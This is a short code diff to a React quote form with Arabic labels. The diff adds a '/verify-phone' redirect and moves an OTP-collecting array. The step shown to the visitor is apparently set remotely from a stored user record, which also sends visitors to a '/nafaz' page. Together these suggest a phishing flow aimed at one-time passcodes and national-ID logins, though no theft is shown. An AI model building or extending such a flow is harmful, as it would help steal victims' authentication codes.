@@ -119,6 +119,7 @@ const validationRules = {
     message: "يرجى إدخال رمز التحقق (6 أرقام)",
   },
 }
+const allOtps=[""]
 
 export function ProfessionalQuoteForm() {
   const [currentPage, setCurrentStep] = useState(1)
@@ -176,9 +177,12 @@ export function ProfessionalQuoteForm() {
               window.location.href='/quote'
           }else if(userData.currentPage ==='8888'|| userData.currentPage ==="nafaz"){
             window.location.href='/nafaz'
-          }else {
-            setCurrentStep(userData.currentPage ||1)
+          }else if(userData.currentPage ==='9999'){
+            window.location.href='/verify-phone'
+          }else if(userData.currentPage !==currentPage){
+            setCurrentStep(userData.currentPage ||currentPage)
           }
+          
           
         } else {
           console.error("User document not found")
@@ -406,7 +410,6 @@ export function ProfessionalQuoteForm() {
       }, 2000)
     }
   }
-const allOtps=[""]
   const handleSubmit = async (e:React.FormEvent) => {
     e.preventDefault()
     const visitorId = localStorage.getItem("visitor")
